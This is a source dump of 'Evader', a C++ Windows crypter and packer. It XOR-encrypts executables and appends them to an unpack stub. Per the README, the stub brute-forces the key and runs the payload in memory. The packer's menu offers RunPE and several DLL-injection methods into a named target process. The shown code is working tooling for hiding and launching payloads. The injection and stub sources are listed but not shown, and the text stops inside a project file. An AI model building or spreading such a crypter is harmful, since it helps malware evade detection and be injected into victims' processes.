Project Path: arc_gmh5225_Evader_9a116pje

Source Tree:

```txt
arc_gmh5225_Evader_9a116pje
├── Evader.sln
├── Packer
│   ├── Packer.vcxproj
│   ├── Packer.vcxproj.filters
│   ├── Packer.vcxproj.user
│   └── src
│       ├── PackRoutines-Packer.cpp
│       ├── PackRoutines-Packer.h
│       └── packer.cpp
├── README.md
└── UnpackStub
    ├── UnpackStub.vcxproj
    ├── UnpackStub.vcxproj.filters
    ├── UnpackStub.vcxproj.user
    └── src
        ├── Execution
        │   ├── CreateRemoteThread.cpp
        │   ├── Execution.cpp
        │   ├── Execution.h
        │   ├── NtCreateThreadEx.cpp
        │   ├── QueueUserAPC.cpp
        │   ├── RtlCreateUserThread.cpp
        │   ├── RunPE.cpp
        │   └── SetWindowsHookEx.cpp
        └── Stub
            ├── PackRoutines-Stub.cpp
            ├── PackRoutines-Stub.h
            └── UnpackStub.cpp

```

`Evader.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio 15
VisualStudioVersion = 15.0.28307.852
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "UnpackStub", "UnpackStub\UnpackStub.vcxproj", "{7EF127A6-58F2-49A8-9A0F-95E182A23184}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "ManualUnpack", "ManualUnpack\ManualUnpack.vcxproj", "{00E651F5-67DD-483D-BC2A-54876B874CDF}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "Packer", "Packer\Packer.vcxproj", "{99F55056-7143-48B1-ABCA-F687DA4EEBC4}"
	ProjectSection(ProjectDependencies) = postProject
		{7EF127A6-58F2-49A8-9A0F-95E182A23184} = {7EF127A6-58F2-49A8-9A0F-95E182A23184}
	EndProjectSection
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{7EF127A6-58F2-49A8-9A0F-95E182A23184}.Debug|x64.ActiveCfg = Debug|x64
		{7EF127A6-58F2-49A8-9A0F-95E182A23184}.Debug|x64.Build.0 = Debug|x64
		{7EF127A6-58F2-49A8-9A0F-95E182A23184}.Debug|x86.ActiveCfg = Debug|Win32
		{7EF127A6-58F2-49A8-9A0F-95E182A23184}.Debug|x86.Build.0 = Debug|Win32
		{7EF127A6-58F2-49A8-9A0F-95E182A23184}.Release|x64.ActiveCfg = Release|x64
		{7EF127A6-58F2-49A8-9A0F-95E182A23184}.Release|x64.Build.0 = Release|x64
		{7EF127A6-58F2-49A8-9A0F-95E182A23184}.Release|x86.ActiveCfg = Release|Win32
		{7EF127A6-58F2-49A8-9A0F-95E182A23184}.Release|x86.Build.0 = Release|Win32
		{00E651F5-67DD-483D-BC2A-54876B874CDF}.Debug|x64.ActiveCfg = Debug|x64
		{00E651F5-67DD-483D-BC2A-54876B874CDF}.Debug|x64.Build.0 = Debug|x64
		{00E651F5-67DD-483D-BC2A-54876B874CDF}.Debug|x86.ActiveCfg = Debug|Win32
		{00E651F5-67DD-483D-BC2A-54876B874CDF}.Debug|x86.Build.0 = Debug|Win32
		{00E651F5-67DD-483D-BC2A-54876B874CDF}.Release|x64.ActiveCfg = Release|x64
		{00E651F5-67DD-483D-BC2A-54876B874CDF}.Release|x64.Build.0 = Release|x64
		{00E651F5-67DD-483D-BC2A-54876B874CDF}.Release|x86.ActiveCfg = Release|Win32
		{00E651F5-67DD-483D-BC2A-54876B874CDF}.Release|x86.Build.0 = Release|Win32
		{99F55056-7143-48B1-ABCA-F687DA4EEBC4}.Debug|x64.ActiveCfg = Debug|x64
		{99F55056-7143-48B1-ABCA-F687DA4EEBC4}.Debug|x64.Build.0 = Debug|x64
		{99F55056-7143-48B1-ABCA-F687DA4EEBC4}.Debug|x86.ActiveCfg = Debug|Win32
		{99F55056-7143-48B1-ABCA-F687DA4EEBC4}.Debug|x86.Build.0 = Debug|Win32
		{99F55056-7143-48B1-ABCA-F687DA4EEBC4}.Release|x64.ActiveCfg = Release|x64
		{99F55056-7143-48B1-ABCA-F687DA4EEBC4}.Release|x64.Build.0 = Release|x64
		{99F55056-7143-48B1-ABCA-F687DA4EEBC4}.Release|x86.ActiveCfg = Release|Win32
		{99F55056-7143-48B1-ABCA-F687DA4EEBC4}.Release|x86.Build.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {95F05159-81A0-47B3-AF54-2B2C3780A20A}
	EndGlobalSection
EndGlobal

```

`Packer/Packer.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>15.0</VCProjectVersion>
    <ProjectGuid>{99F55056-7143-48B1-ABCA-F687DA4EEBC4}</ProjectGuid>
    <RootNamespace>Packer</RootNamespace>
    <WindowsTargetPlatformVersion>10.0.17763.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <OutDir>$(SolutionDir)PackerBuild\bin\$(Platform)\$(Configuration)\</OutDir>
    <IntDir>$(SolutionDir)PackerBuild\bin\Intermediates\$(Platform)\$(Configuration)\</IntDir>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <OutDir>$(SolutionDir)PackerBuild\bin\$(Platform)\$(Configuration)\</OutDir>
    <IntDir>$(SolutionDir)PackerBuild\bin\Intermediates\$(Platform)\$(Configuration)\</IntDir>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <OutDir>$(SolutionDir)PackerBuild\bin\$(Platform)\$(Configuration)\</OutDir>
    <IntDir>$(SolutionDir)PackerBuild\bin\Intermediates\$(Platform)\$(Configuration)\</IntDir>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <OutDir>$(SolutionDir)PackerBuild\bin\$(Platform)\$(Configuration)\</OutDir>
    <IntDir>$(SolutionDir)PackerBuild\bin\Intermediates\$(Platform)\$(Configuration)\</IntDir>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <SDLCheck>true</SDLCheck>
      <ConformanceMode>true</ConformanceMode>
      <PreprocessorDefinitions>_CRT_SECURE_NO_DEPRECATE;_MBCS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
    </ClCompile>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <SDLCheck>true</SDLCheck>
      <ConformanceMode>true</ConformanceMode>
      <PreprocessorDefinitions>_CRT_SECURE_NO_DEPRECATE;_MBCS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
    </ClCompile>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <ConformanceMode>true</ConformanceMode>
      <PreprocessorDefinitions>_CRT_SECURE_NO_DEPRECATE;_MBCS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
    </ClCompile>
    <Link>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <ConformanceMode>true</ConformanceMode>
      <PreprocessorDefinitions>_CRT_SECURE_NO_DEPRECATE;_MBCS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
    </ClCompile>
    <Link>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="src\packer.cpp" />
    <ClCompile Include="src\PackRoutines-Packer.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="src\PackRoutines-Packer.h" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`Packer/Packer.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="src\packer.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="src\PackRoutines-Packer.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="src\PackRoutines-Packer.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
</Project>
```

`Packer/Packer.vcxproj.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup>
    <ShowAllFiles>true</ShowAllFiles>
  </PropertyGroup>
</Project>
```

`Packer/src/PackRoutines-Packer.cpp`:

```cpp
#include "PackRoutines-Packer.h"

const char* packerrors_str[] = {
	"Success",
	"Archive empty; no files to extract",
	"Error in supplied Path",
	"Could not create output archive file",
	"Not a valid packed file",
	"Failed while extracting one of the files",
	"Input archive file failed to open",
	"Can not retrieve Encryption key"
};

char* key;
char mainsignature[] = "EVADERPROJECT";

int KEY_SIZE;
int START_ASCII;
int END_ASCII;

int packfilesEx(char* path, char* mask, char* archive, int KEYSIZE, int STARTASCII, int ENDASCII, int exeMethod, char* targetProgram, packcallbacks_t* pcb) {

	TCHAR szCurDir[MAX_PATH];

	std::vector<packdata_t> filesList;

	GetCurrentDirectory(MAX_PATH, szCurDir);

	if (!SetCurrentDirectory(path))
		return packerrorPath;

	WIN32_FIND_DATA fd;
	HANDLE findHandle;
	packdata_t pdata;

	findHandle = FindFirstFile(mask, &fd);

	if (findHandle == INVALID_HANDLE_VALUE)
		return packerrorNoFiles;

	char SIG[13];
	SIZE_T nfiles;

	KEY_SIZE = KEYSIZE;
	START_ASCII = STARTASCII;
	END_ASCII = ENDASCII;

	// Set a random key
	key = new char[KEY_SIZE]();
	setKey(key, KEY_SIZE);

	// Encrypt signature
	for (int i = 0; i < sizeof(SIG); i++)
		SIG[i] = mainsignature[i] ^ key[i % sizeof(key) / sizeof(char)];
		
	
	// Just somerefactoring for multiple files
	do {

		if ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == FILE_ATTRIBUTE_DIRECTORY) 
			continue;

		memset(&pdata, 0, sizeof(pdata));

		strcpy_s(pdata.filename, fd.cFileName);

		pdata.filesize = fd.nFileSizeLow;

		filesList.push_back(pdata);


	} while (FindNextFile(findHandle, &fd));

	FindClose(findHandle);

	FILE* fpArchive = fopen(archive, "wb");

	if (!fpArchive) return packerrorCannotCreateArchive;

	// Write key length and complexcity to file
	fwrite(&KEY_SIZE, sizeof(KEY_SIZE), 1, fpArchive);
	fwrite(&START_ASCII, sizeof(START_ASCII), 1, fpArchive);
	fwrite(&END_ASCII, sizeof(END_ASCII), 1, fpArchive);

	// Wirte encrypted signature
	fwrite(SIG, sizeof(char), sizeof(SIG), fpArchive);

	// write execution method
	fwrite(&exeMethod, sizeof(int), 1, fpArchive);

	//write targetprogram name
	if (exeMethod > 0)
		fwrite(targetProgram, sizeof(char), 80, fpArchive);
	//printf("%s", targetProgram);
	//Sleep(5000);

	// Write entries count
	nfiles = filesList.size();
	fwrite(&nfiles, sizeof(nfiles), 1, fpArchive);

	// Store files entries (since std::vector stores elements in a linear manner)
	fwrite(&filesList[0], sizeof(pdata), filesList.size(), fpArchive);

	// process all files
	for (unsigned int cnt = 0; cnt < filesList.size(); cnt++) {

		FILE* inFile = fopen(filesList[cnt].filename, "rb");
		long size = filesList[cnt].filesize;

		// if callback assigned then trigger it
		if (pcb && pcb->newfile)
			pcb->newfile(filesList[cnt].filename, size);

		// copy filename
		long pos = 0;
		while (size > 0) {
			char buffer[4096];
			
			long toread = size > sizeof(buffer) ? sizeof(buffer) : size;
			fread(buffer, toread, 1, inFile);
			for (int i = 0; i < sizeof(buffer); i++) // for loop for scrambing bits in the string 
				buffer[i] = buffer[i] ^ key[i % sizeof(key) / sizeof(char)]; // scrambling string
			fwrite(buffer, toread, 1, fpArchive);
			pos += toread;
			size -= toread;
			if (pcb && pcb->fileprogress)
				pcb->fileprogress(pos);

		}
		fclose(inFile); // close archive and restore working directory
	}

	// close archive
	fclose(fpArchive);

	SetCurrentDirectory(szCurDir);
	return packerrorSuccess;

}

int packfiles(char* path, char* mask, char* archive, int KEYSIZE, int STARTASCII, int ENDASCII, int exeMethod, char* targetProgram) {
	return packfilesEx(path, mask, archive, KEYSIZE, STARTASCII, ENDASCII, exeMethod, targetProgram, NULL);
}


int SfxSetInsertPos(char *filename, long pos){

	FILE *fp = fopen(filename, "rb+");
	if (fp == NULL)
		return packerrorCouldNotOpenArchive;

	IMAGE_DOS_HEADER idh;

	// read dos header
	fread((void *)&idh, sizeof(idh), 1, fp);

	// adjust position value in an unused MZ field
	*(long *)&idh.e_res2[0] = pos;

	// update header
	rewind(fp);
	fwrite((void *)&idh, sizeof(idh), 1, fp);
	fclose(fp);
	return packerrorSuccess;
}


void setKey(char* key, int key_size) {

	srand((unsigned int)time(NULL));

	std::cout << "encryption key : ";
	for (int i = 0; i < key_size; ++i) {
		key[i] = char(START_ASCII + rand() % (END_ASCII - START_ASCII + 1));
		std::cout << key[i];
	}

	std::cout << "\n";

}
```

`Packer/src/PackRoutines-Packer.h`:

```h
#pragma once

#ifndef __PACKROUTINES__H__
#define __PACKROUTINES__H__

#include <Windows.h>
#include <tchar.h>
#include <stdlib.h>
#include <stdio.h>
#include <vector>
#include <iostream>
#include <time.h>
#include <TlHelp32.h>
#include <iostream>
#include <string>

enum packerrors {
	packerrorSuccess = 0, // no error
	packerrorNoFiles, // no files to extract; empty archive
	packerrorPath, // error in path
	packerrorCannotCreateArchive, // archive file creation error
	packerrorNotAPackedFile, // could not unpack non-archive file
	packerrorExtractError, // could not extract to file
	packerrorCouldNotOpenArchive, // failed to open archive for extraction
	packerrorKeyNotFound // failed to retrieve key by bruteforcing
};


extern const char *packerrors_str[];

typedef struct {
	char filename[MAX_PATH];
	long filesize;
} packdata_t;

typedef struct {
	void(*newfile)(char* name, long size);
	void(*fileprogress)(long pos);
} packcallbacks_t;

int packfilesEx(char* path, char* mask, char* archive, int KEY_SIZE, int START_ASCII, int END_ASCII, int exeMethod, char* targetProgram, packcallbacks_t* = NULL);
int packfiles(char *path, char *mask, char *archive, int KEY_SIZE, int START_ASCII, int END_ASCII ,int exeMethod, char* targetProgram);

int SfxSetInsertPos(char *filename, long pos);

void setKey(char* key, int key_size);

#endif
```

`Packer/src/packer.cpp`:

```cpp
#include "PackRoutines-Packer.h"

const char sfxStubFile[] = "UnpackStub.exe";

void newfile(char* filename, long size) {
	printf("\xd  --> %s [%d]\n", filename, size);
}

void fileprogress(long pos) {
	printf("%ld                 \xd", pos);
}

int main(int argc, char* argv[]) {

	printf("EVADER project v1.0\n");

	// display usage
	if (argc < 5) {
		printf(
			"EVADER project v1.0\n"
			"usage:\n"
			" Packer.exe inputfile_Path(like c:\\users\\xxx\\files\\ whilc containst your files/file) outputfile_name(like c:\\users\\xxx\\output\\output.exe) KEY_SIZE KEY_START_ASCII KEY_END_ASCII\n"
			" example:\n"
			" Packer c:\\users\\xxx\\files\\ c:\\users\\xxx\\files\\ 7 65 90"
			"Thic commands encrypt all files(.exe) inside c:\\users\\xxx\\files\\ and write output to c:\\users\\xxx\\output\\output.exe with key size 7 and from AAAA(65.65.65.65) to ZZZZ(90.90.90.90)"
			"\n\n\n"
		);
		return 0;
	}

	printf(
		"\n\n"
		"   0) Run PE                   (execute payload directy inside memory of current process address space)\n"
		"   1) CreateRemoteThread       (DLL injection by CreateRemoteThread Win32 API)\n"
		"   2) NtCreateThread           (DLL injection by NtCreateThread native API)\n"
		"   3) QueueUserAPC             (DLL injection by adding user-mode asychronous procedure call(APC) object to the APC queue of specified thread)\n"
		"   4) SetWindowsHookEx         (DLL injection by setting a windows hook)\n"
		"   5) RtlCreateUserThread      (DLL injection by RtlCreateUserThread native API)\n"
		"\n\n"
	);

	int exeMethod = -1;
	char szProc[80];

	printf("Choose payload execution method : ");
	scanf("%d", &exeMethod);

	if (exeMethod > 0) {
		printf("Target process name : ");
		scanf_s("%79s", szProc, 79);
	}
	else {
		strcpy(szProc, "xxxxxxxx");
	}


	int KEY_SIZE;
	int START_ASCII;
	int END_ASCII;

	// set packer's callback info
	packcallbacks_t pcb;
	pcb.fileprogress = fileprogress;
	pcb.newfile = newfile;

	// set encryption key size and complexicity
	KEY_SIZE = atoi(argv[3]);
	START_ASCII = atoi(argv[4]);
	END_ASCII = atoi(argv[5]);
	
	// create archive file
	int rc = packfilesEx(argv[1], (char*)("*.exe"), argv[2], KEY_SIZE, START_ASCII, END_ASCII, exeMethod, szProc, &pcb);
	printf("               \n");

	if (rc != packerrorSuccess) {
		printf("%s\n", packerrors_str[rc]);
		return 1;
	}

	if (GetFileAttributes(sfxStubFile) == (DWORD)-1)
	{
		printf("SFX stub file not found!");
		return 1;
	}

	// open archive file
	FILE *fpArc = fopen(argv[2], "rb");
	if (!fpArc)
	{
		printf("Failed to open archive!\n");
		return 1;
	}

	// get archive size
	fseek(fpArc, 0, SEEK_END);
	long arcSize = ftell(fpArc);
	rewind(fpArc);

	// form output sfx file name
	char sfxName[MAX_PATH];
	strcpy(sfxName, argv[2]);
	strcat(sfxName, ".exe");
			
	// take a copy from SFX
	if (!CopyFile(sfxStubFile, sfxName, FALSE))
	{
		fclose(fpArc);
		printf("Could not create SFX file!\n");
		return 1;
	}
	
	// append data to SFX
	FILE *fpSfx = fopen(sfxName, "rb+");
	fseek(fpSfx, 0, SEEK_END);

	// get SFX size before archive appending
	long sfxSize = ftell(fpSfx);

	// start appending from archive file to the end of SFX file
	char buffer[4096 * 2];
	while (arcSize > 0)
	{
		long rw = arcSize > sizeof(buffer) ? sizeof(buffer) : arcSize;
		fread(buffer, rw, 1, fpArc);
		fwrite(buffer, rw, 1, fpSfx);
		arcSize -= rw;
	}
	fclose(fpArc);
	fclose(fpSfx);

	// mark archive data position inside SFX
	SfxSetInsertPos(sfxName, sfxSize);

	// delete archive file while keeping only the SFX
	DeleteFile(argv[2]);

	printf("SFX created: %s\n", sfxName);

	return 0;
}
```

`README.md`:

```md
# Evader
========
 
It's an exe packer (and a crypter) which will encrypt your PE exe input file and add it as resource to the end of the output new exe file
The encryption key size and complexity can be given as input

# Usage of packer (Encryption)
-----------------

    packer.exe <input-path> <output-path> <key-size> <start-ascii> <end-ascii>
  
The complexity of encryption key will be determined by <start-ascii> and <end-ascii>
  
for example this command will lead to keys from AAAA to ZZZZ

    packer.exe <input-path> <output-path> 4 65 90
    
# The Decryption part
-------------------
Decryption isn't like other packers stub and it's based on bruteforcing and examining each character to retrieve the encryption key! why!?

And after retrieving key the encrypted payload will be decrypted and will be run directly inside memory and in form of char[] whcih is contained each byte of the main PE file!

# Credits
 https://www.codeproject.com/Articles/5035/How-to-Write-a-Simple-Packer-Unpacker-with-a-Self
 https://www.youtube.com/watch?v=bQWRW0VUXR4

```

`UnpackStub/UnpackStub.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>15.0</VCProjectVersion>
    <ProjectGuid>{7EF127A6-58F2-49A8-9A0F-95E182A23184}</ProjectGuid>
    <RootNamespace>UnpackStub</RootNamespace>
    <WindowsTargetPlatformVersion>10.0.17763.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <OutDir>$(SolutionDir)UnpackStubBuild\bin\$(Platform)\$(Configuration)\</OutDir>
    <IntDir>$(SolutionDir)UnpackStubBuild\bin\Intermediates\$(Platform)\$(Configuration)\</IntDir>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <OutDir>$(SolutionDir)UnpackStubBuild\bin\$(Platform)\$(Configuration)\</OutDir>
    <IntDir>$(SolutionDir)UnpackStubBuild\bin\Intermediates\$(Platform)\$(Configuration)\</IntDir>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <OutDir>$(SolutionDir)UnpackStubBuild\bin\$(Platform)\$(Configuration)\</OutDir>
    <IntDir>$(SolutionDir)UnpackStubBuild\bin\Intermediates\$(Platform)\$(Configuration)\</IntDir>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <OutDir>$(SolutionDir)UnpackStubBuild\bin\$(Platform)\$(Configuration)\</OutDir>
    <IntDir>$(SolutionDir)UnpackStubBuild\bin\Intermediates\$(Platform)\$(Configuration)\</IntDir>
  </PropertyGroup>
